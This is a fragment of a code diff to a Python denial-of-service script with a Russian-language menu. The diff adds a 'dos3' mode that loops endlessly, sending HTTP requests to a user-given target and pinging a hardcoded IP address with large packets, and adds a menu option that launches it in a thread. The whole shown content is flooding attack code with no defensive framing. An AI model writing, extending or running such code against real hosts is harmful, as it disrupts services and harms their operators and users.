@@ -24,6 +24,11 @@ def dos():
 def dos2():
  while True:
   os.system("ping 174.123.1.23 -t -l " + str(paket))
+  
+def dos3():
+ while True:
+  requests.get("%s" % str(ddos))
+  os.system("ping 174.123.1.23 -t -l " + str(paket))  
 while True:
  print(-"""
  
@@ -42,7 +47,8 @@ while True:
   
   input("Нажмите на Enter чтобы начать!")
   dos2()
- 
+ elif "3" == menu:
+  threading.Thread(target=dos3).start()
  else:
   print("Данный режим не сушествует!")
   
